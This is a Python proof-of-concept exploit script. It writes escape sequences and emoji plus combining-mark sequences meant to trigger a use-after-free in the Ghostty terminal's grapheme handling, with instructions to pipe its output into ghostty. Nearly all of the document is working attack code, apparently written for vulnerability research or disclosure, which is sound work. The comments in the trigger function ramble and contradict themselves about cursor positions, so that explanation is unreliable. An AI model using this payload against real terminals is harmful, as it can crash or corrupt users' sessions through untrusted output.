#!/usr/bin/env python3
"""
PoC: Use-After-Free in Ghostty Grapheme Transfer During Emoji Width Change.

Vulnerability: src/terminal/Terminal.zig:448-469
Severity: CRITICAL - remotely triggerable via malicious terminal output

When a VS16 emoji variation selector triggers a narrow-to-wide cell
transition at the right margin with grapheme clustering enabled (mode
2027), grapheme data is transferred across pages in a loop that calls
appendGrapheme(). If appendGrapheme() triggers increaseCapacity() (page
reallocation), the loop variable new_rac.cell becomes a dangling pointer.
Subsequent iterations pass this freed pointer, causing use-after-free.

Trigger conditions:
  1. Grapheme clustering mode enabled (DECSET 2027)
  2. Wraparound mode enabled (default)
  3. Emoji base char + combining mark at the rightmost column
  4. VS16 (U+FE0F) sent to widen the character
  5. Previous row and new row are on different pages (cross-page wrap)
  6. The target page's grapheme storage is nearly full

Usage:
  python3 poc_uaf_grapheme.py | ghostty    # pipe to ghostty
  python3 poc_uaf_grapheme.py > payload    # save and replay via PTY

This PoC works by:
  - Enabling grapheme clustering (mode 2027)
  - Writing grapheme-heavy content to exhaust page grapheme capacity
  - Repeatedly placing an emoji+combining mark at the right edge
  - Sending VS16 to trigger the narrow->wide transition + grapheme transfer
  - Cycling through enough rows to hit cross-page boundaries (~215 rows/page)
"""

import sys
import struct

COLS = 80  # Assumed terminal width; adjust if needed

# Page capacity constants (from page.zig std_capacity)
PAGE_ROWS = 215
GRAPHEME_BYTES = 8192  # production; 512 in test builds
GRAPHEME_CHUNK = 16    # 4 codepoints * 4 bytes each
MAX_GRAPHEMES_PER_PAGE = GRAPHEME_BYTES // GRAPHEME_CHUNK  # 512


def emit(data):
    """Write raw bytes to stdout."""
    if isinstance(data, str):
        data = data.encode('utf-8')
    sys.stdout.buffer.write(data)


def csi(s):
    """Emit a CSI escape sequence."""
    emit(f"\x1b[{s}")


def osc(s):
    """Emit an OSC escape sequence."""
    emit(f"\x1b]{s}\x1b\\")


# UTF-8 encoding helpers
COMBINING_GRAVE = "\u0300"     # Combining Grave Accent (Grapheme_Break=Extend)
COMBINING_ACUTE = "\u0301"     # Combining Acute Accent
HEART = "\u2764"               # Heavy Black Heart (emoji_vs_base, text presentation = narrow)
VS16 = "\uFE0F"               # Variation Selector 16 (emoji presentation = wide)


def fill_line_with_graphemes(n_graphemes):
    """Write a line where cells have combining marks, consuming grapheme storage.

    Each cell with a combining mark uses one grapheme chunk (16 bytes) on the page.
    We write base char + combining mark pairs, filling the line.
    """
    for i in range(min(n_graphemes, COLS - 1)):
        # Write a base letter + combining mark. The combining mark is stored
        # as grapheme data on the page, consuming one grapheme chunk.
        emit(f"a{COMBINING_GRAVE}")
    # Newline to advance to the next row
    emit("\n")


def trigger_sequence():
    """Emit the trigger: emoji + combining mark at right edge, then VS16.

    This places an emoji base character with grapheme data at column COLS-1,
    then sends VS16 to trigger the narrow->wide transition. If we're at a
    page boundary and the page's grapheme storage is nearly full, this
    triggers the use-after-free.
    """
    # Fill the line up to the last column (COLS-1 characters for columns 0..COLS-2)
    emit("X" * (COLS - 2))

    # Write emoji base at column COLS-2, which will advance cursor to COLS-1
    # Actually, we need the emoji at column COLS-1 (the last column).
    # After writing COLS-2 X's, cursor is at column COLS-2.
    # Write the emoji at column COLS-2 (0-indexed), then it sets pending_wrap = true
    # Wait, let me recalculate: after writing COLS-2 characters, cursor is at column COLS-2.
    # We need the cursor at COLS-1. Write one more regular char to get to COLS-1.

    # After COLS-2 'X's, cursor is at column COLS-2
    # Write the heart emoji (width 1 in text presentation) at COLS-2
    # This advances cursor to COLS-1, then pending_wrap is NOT set yet
    # Hmm, let me reconsider. After writing at COLS-1, pending_wrap IS set.

    # After COLS-1 regular chars, cursor is at COLS-1 (last column).
    # The last char written occupied column COLS-2 and cursor moved to COLS-1.
    # No wait - after writing N chars starting from col 0, cursor is at col N.
    # After writing COLS-2 'X's, cursor is at col COLS-2.
    # Write one more char to get cursor to col COLS-1.
    emit("Y")
    # Now cursor is at col COLS-1 (the last column). Write heart here.
    emit(HEART)
    # After writing heart (width 1) at col COLS-1, pending_wrap = true.

    # Now add combining mark. With mode 2027 + pending_wrap, this attaches to
    # the current cell (heart at col COLS-1), adding grapheme data.
    emit(COMBINING_GRAVE)

    # Now add a second combining mark so the cell has 2 grapheme codepoints.
    # This means the transfer loop will iterate at least twice, which is needed
    # to observe the stale pointer on the second iteration.
    emit(COMBINING_ACUTE)

    # NOW send VS16. This triggers:
    # 1. Grapheme clustering: no break between heart+combines and VS16
    # 2. desired_wide = .wide (heart has emoji_vs_base)
    # 3. At right_limit-1: wraps to next line (possibly different page)
    # 4. prev.cell.hasGrapheme() = true → enters transfer_graphemes block
    # 5. If cross-page: enters the vulnerable loop at line 449-452
    # 6. If grapheme storage nearly full: appendGrapheme triggers increaseCapacity
    # 7. new_rac.cell becomes dangling → USE-AFTER-FREE on next iteration
    emit(VS16)

    # Newline to move on
    emit("\n")


def main():
    # === Setup ===
    # Enable grapheme clustering mode (DECSET 2027)
    csi("?2027h")

    # Ensure wraparound is enabled (DECSET 7)
    csi("?7h")

    # === Phase 1: Fill initial pages with normal content ===
    # Write enough lines to push past the first page boundary.
    # With ~215 rows per page, writing 250 lines guarantees we cross at least one boundary.
    emit("--- Phase 1: Filling initial page ---\n")
    for _ in range(PAGE_ROWS + 40):
        emit("." * (COLS - 1) + "\n")

    # === Phase 2: Fill grapheme storage and repeatedly try the trigger ===
    # We cycle through multiple page-worth of rows, filling grapheme storage
    # along the way and attempting the trigger at each row. Since page
    # boundaries occur every ~215 rows, cycling through 3 pages worth of
    # rows (~645 rows) gives us ~3 chances to hit a boundary.
    #
    # On each cycle:
    #   1. Write grapheme-heavy lines to fill the page's grapheme storage
    #   2. Attempt the trigger at the right edge
    #   3. If we're at a page boundary AND storage is full → UAF fires

    emit("--- Phase 2: Grapheme filling + trigger attempts ---\n")

    for cycle in range(4):  # 4 cycles through page-sized blocks
        # Fill most of this page's grapheme capacity.
        # Each line can have up to COLS-1 grapheme cells.
        # We need ~512 grapheme entries to fill a page.
        # With ~79 graphemes per line, that's ~7 lines.
        graphemes_written = 0
        lines_for_graphemes = (MAX_GRAPHEMES_PER_PAGE - 10) // (COLS - 1) + 1

        for _ in range(lines_for_graphemes):
            fill_line_with_graphemes(COLS - 1)
            graphemes_written += COLS - 1

        # Write some normal lines to advance closer to the page boundary.
        # We need to reach close to the 215th row of this page.
        remaining_rows = PAGE_ROWS - lines_for_graphemes - 5
        for _ in range(max(0, remaining_rows)):
            emit("N" * (COLS - 1) + "\n")

        # Now attempt the trigger for several consecutive rows.
        # At least one of these should be at or near a page boundary.
        for attempt in range(10):
            trigger_sequence()

    # === Phase 3: Aggressive final attempt ===
    # Fill grapheme storage to the absolute brim, then trigger
    emit("--- Phase 3: Aggressive trigger ---\n")

    # Write grapheme-heavy content for many lines straight
    for _ in range(MAX_GRAPHEMES_PER_PAGE // (COLS - 1) + 2):
        fill_line_with_graphemes(COLS - 1)

    # Fire trigger repeatedly
    for _ in range(20):
        trigger_sequence()

    # === Cleanup ===
    # Disable grapheme clustering
    csi("?2027l")

    emit("\n--- PoC complete ---\n")
    emit("If ghostty crashed or ASAN reported a use-after-free, the vulnerability triggered.\n")
    emit("Build with -Doptimize=Debug or ASAN to observe the bug.\n")


if __name__ == "__main__":
    main()
